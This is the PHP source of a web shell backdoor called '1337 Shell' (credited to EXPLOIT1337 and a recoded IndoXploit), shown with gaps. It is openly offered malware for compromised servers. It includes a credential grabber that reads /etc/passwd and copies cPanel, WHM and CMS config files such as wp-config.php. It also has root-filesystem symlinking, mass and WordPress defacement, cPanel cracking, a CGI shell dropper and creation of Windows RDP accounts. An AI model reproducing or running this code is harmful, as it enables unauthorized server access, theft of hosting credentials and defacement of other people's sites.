<?php
// Shell Default is : 1337 Shell
// This shell backdoor was created from SBCTOR (PYTHON 3) By Ubaii ID
// IF YOU WANT THIS SHELL MAKE BETTER, PLEASE USE MY TOOL
// Contact if you found a bug : fb.me/kakko.go.id
// THANKS FOR USE MY TOOL!
$auth_pass = "8c0bdc5b29a4248d61f66102c5c1a3e7";
session_start();
error_reporting(0);
set_time_limit(0);
...
<head>
	<title>1337 Shell</title>
	<meta name='author' content='EXPLOIT1337'>
	<meta charset="UTF-8">
	<style type='text/css'>
	...
	#menu a {
		...
		letter-spacing: 2px;
		border-radius: 2px;
		border-bottom: 2px solid #8e6841;
		border-top: 2px solid #8e6841;
		border-right: 2px solid #8e6841;
		border-left: 2px solid #8e6841;
	}
	#menu a:hover {
		background:black; 
	...
	.mybox{
		...
		border-radius: 10px;
		border:1px solid #8e6841; padding:4px 2px;
		width:70%;
		line-height:24px;
		background:none;
...
echo "<br>";
echo "&nbsp;<a href='?' style='border:2px solid #8e6841;width:80px;padding:0px 8px 0px 8px;'>H O M E</a>&nbsp;<a href='?shell&do=kill' style='border:2px solid #8e6841;width:80px;padding:0px 8px 0px 8px;'>K I L L </a>&nbsp;<a href='?byee&do=logout' style='color:red;border:2px solid #8e6841;width:80px;padding:0px 8px 0px 8px;'>L O G O U T</a>";
echo "</td></table>";
echo "<div id='menu'>";
echo "<hr>";
echo "<center>";
...
echo "<li> <a href='?dir=$dir&do=symlink2'>Symlink V.2</a> </li><br><br>";
...
echo "<li> <a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> </li><br><br>";
...
echo "<li> <a href='?dir=$dir&do=adminer'>Adminer</a> </li><br><br>";
...
echo "<hr color='#8e6841'>";
if($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=#8e6841>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
			...
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=cyan>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
	...
	<input type='radio' name='tipe_upload' value='home_root'>Home Root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
...
SecFilterScanPOST Off
	...
	function rmdir_recursive($dir) {
		...
		<input type='text' name='save' value='$dir/exploit_backup.zip' style='width: 450px;' height='10'><br><br>
    ...
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input type='text' name='save' value='$dir/exploit_unzip' style='width: 450px;' height='10'><br><br>
...
echo '<form action="?dir=$dir&do=logout" method="post">';
    ...
    echo '<center>Gwe Ganteng, Napa Ngak Suka?</center>';
	...
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("exploit_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("exploit_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_exploit) {
			$user_config_dir = "/home/$user_exploit/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					"/home/$user_exploit/.my.cnf" => "cpanel",
					"/home/$user_exploit/.accesshash" => "WHM-accesshash",
					"/home/$user_exploit/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_exploit/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_exploit/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_exploit/public_html/clientarea/configuration.php" => "WHMCS",
					"/home/$user_exploit/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_exploit/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_exploit/public_html/forum/config.php" => "phpBB",
					"/home/$user_exploit/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_exploit/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_exploit/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_exploit/public_html/joomla/configuration.php" => "Joomla",
					"/home/$user_exploit/public_html/configuration.php" => "Joomla",
					"/home/$user_exploit/public_html/wp/wp-config.php" => "WordPress",
					"/home/$user_exploit/public_html/wordpress/wp-config.php" => "WordPress",
					"/home/$user_exploit/public_html/wp-config.php" => "WordPress",
					"/home/$user_exploit/public_html/admin/config.php" => "OpenCart",
					"/home/$user_exploit/public_html/slconfig.php" => "Sitelok",
					"/home/$user_exploit/public_html/application/config/database.php" => "Ellislab",
					"/home1/$user_exploit/.my.cnf" => "cpanel",
					"/home1/$user_exploit/.accesshash" => "WHM-accesshash",
					"/home1/$user_exploit/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_exploit/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_exploit/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_exploit/public_html/clientarea/configuration.php" => "WHMCS",
					"/home1/$user_exploit/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_exploit/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_exploit/public_html/forum/config.php" => "phpBB",
					"/home1/$user_exploit/public_html/sites/default/settings.php" => "Drupal",
					"/home1/$user_exploit/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_exploit/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_exploit/public_html/joomla/configuration.php" => "Joomla",
					"/home1/$user_exploit/public_html/configuration.php" => "Joomla",
					"/home1/$user_exploit/public_html/wp/wp-config.php" => "WordPress",
					"/home1/$user_exploit/public_html/wordpress/wp-config.php" => "WordPress",
					"/home1/$user_exploit/public_html/wp-config.php" => "WordPress",
					"/home1/$user_exploit/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_exploit/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_exploit/public_html/application/config/database.php" => "Ellislab",
					"/home2/$user_exploit/.my.cnf" => "cpanel",
					"/home2/$user_exploit/.accesshash" => "WHM-accesshash",
					"/home2/$user_exploit/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_exploit/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_exploit/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_exploit/public_html/clientarea/configuration.php" => "WHMCS",
					"/home2/$user_exploit/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_exploit/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_exploit/public_html/forum/config.php" => "phpBB",
					"/home2/$user_exploit/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_exploit/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_exploit/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_exploit/public_html/joomla/configuration.php" => "Joomla",
					"/home2/$user_exploit/public_html/configuration.php" => "Joomla",
					"/home2/$user_exploit/public_html/wp/wp-config.php" => "WordPress",
					"/home2/$user_exploit/public_html/wordpress/wp-config.php" => "WordPress",
					"/home2/$user_exploit/public_html/wp-config.php" => "WordPress",
					"/home2/$user_exploit/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_exploit/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_exploit/public_html/application/config/database.php" => "Ellislab",
					"/home3/$user_exploit/.my.cnf" => "cpanel",
					"/home3/$user_exploit/.accesshash" => "WHM-accesshash",
					"/home3/$user_exploit/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_exploit/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_exploit/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_exploit/public_html/clientarea/configuration.php" => "WHMCS",
					"/home3/$user_exploit/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_exploit/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_exploit/public_html/forum/config.php" => "phpBB",
					"/home3/$user_exploit/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_exploit/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_exploit/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_exploit/public_html/joomla/configuration.php" => "Joomla",
					"/home3/$user_exploit/public_html/configuration.php" => "Joomla",
					"/home3/$user_exploit/public_html/wp/wp-config.php" => "WordPress",
					"/home3/$user_exploit/public_html/wordpress/wp-config.php" => "WordPress",
					"/home3/$user_exploit/public_html/wp-config.php" => "WordPress",
					"/home3/$user_exploit/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_exploit/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_exploit/public_html/application/config/database.php" => "Ellislab"
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("exploit_config/$user_exploit-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/exploit_config'><font color=cyan>Done</font></a></center>";
			}else{
	...
	<form action="?y=<?php echo $pwd; ?>&amp;do=adfin" method="post">
		...
		function template() {
			...
			<div class="red">
			<div class="tube">
			<center><table class="tabnet"><th colspan="2"><font size="4px">Admin Finder</font></th><tr><td>
		...
		foreach($pathes as $path) {
			...
			show('<span style="color: red;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
...
fclose($fp); 
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<input type='text' name='d_file' placeholder='index.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;' placeholder='Your Script Deface'></textarea><br>
...
elseif($_GET['do'] == 'symlink2') {
	...
	if($d0mains){
		...
		echo "
		<table align=center border=1 style='width:60%;border-color:green;'>
		<tr>
		...
		foreach($d0mains as $d0main){
			...
			if(strlen(trim($domains[1][0])) > 2){
				...
				<td>".$user['name']."</td>
				<td><a href='$full/exploit_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
				flush();
				$dcount++;}}}
				echo "</table>";
			} else{
				...
				if ($TEST){
					...
					while(!feof($file)){
						...
						echo "<td align=center><font class=txt><a href=$full/exploit_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
						$dcount++;}fclose($file);
						echo "</table>";
					} else{
						if($os != "Windows"){@mkdir("exploit_sym",0777);
						@chdir("exploit_sym");@exe("ln -s / root");$file3 = 'Options Indexes FollowSymLinks
						DirectoryIndex index.htm
						AddType text/plain .php
						AddHandler text/plain .php
						Satisfy Any';
	...
	<u>Defacer</u>: <br>
	<input type='text' name='hekel' size='50' placeholder='Your Nickname'><br>
	<u>Team</u>: <br>
	<input type='text' name='tim' size='50' placeholder='Your Team'><br>
	<u>Domains</u>: <br>
			...
			foreach($user_config[1] as $user_exploit) {
				...
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_exploit/.my.cnf" => "cpanel",
						"/home/$user_exploit/.accesshash" => "WHM-accesshash",
						"/home/$user_exploit/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_exploit/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_exploit/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_exploit/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_exploit/public_html/clientarea/configuration.php" => "WHMCS",
	...
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			...
			foreach($user_jumping[1] as $user_exploit_jump) {
				$user_jumping_dir = "/home/$user_exploit_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=cyan>R</font>] <a href='?dir=$user_jumping_dir'><font color=green>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=cyan>RW</font>] <a href='?dir=$user_jumping_dir'><font color=green>$user_jumping_dir</font></a>";
					}
					echo $jrw;
					if(function_exists('posix_getpwuid')) {
						...
						if($domain_jump == '') {
							...
							foreach($domains_jump[1] as $dj) {
								...
								if($user_jumping_url == $user_exploit_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='EXPLOIT1337' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='EXPLOIT1337' placeholder='pass_baru'><br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses Crack ".$i." Cpanel by <font color=cyan>EXPLOIT1337 Shell.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by EXPLOIT1337' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='EXPLOIT1337'><br>
		<u>Domains</u>: <br>
	...
	@set_time_limit(0);
	echo "<br><br><center><h1>Symlink V1 With SymConfig</h1></center><br><br><center><div class=content>";
	@mkdir('sym',0777);
	...
	echo "<br><br><div class='tmp'><table border='1' bordercolor='cyan' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
	...
	$cgi_dir = mkdir('exploit_cgi', 0755);
	$file_cgi = "exploit_cgi/cgi.izo";
	...
	chmod($file_cgi, 0755);
	echo "<iframe src='exploit_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by EXPLOIT1337' required><br>
    ...
    if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
        if($_POST['create']) {
            ...
            if($_POST['opsi'] == '1') {
                ...
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[change password: <font color=cyan>error</font>] -> ";
                    if($cek) {
            ...
            echo "!~ Create RDP ~!<br>
            <form method='post'>
            <input type='text' name='user' placeholder='username' value='EXPLOIT1337' required>
            <input type='text' name='pass' placeholder='password' value='EXPLOIT1337' required>
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if(preg_match("/$user/", exe("net user"))) {
    			...
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=blue>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br>
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user EXPLOIT1337");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=blue>EXPLOIT1337</font>] -> ";
					if($cek) {
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://exploit1337.blogspot.co.id/' target='_blank'><font color=red>EXPLOIT1337</font></a></center>";
	echo "<center><font color='red'>Recoded IndoXploit And All Shell By Cerberus";
	}
?>
</html>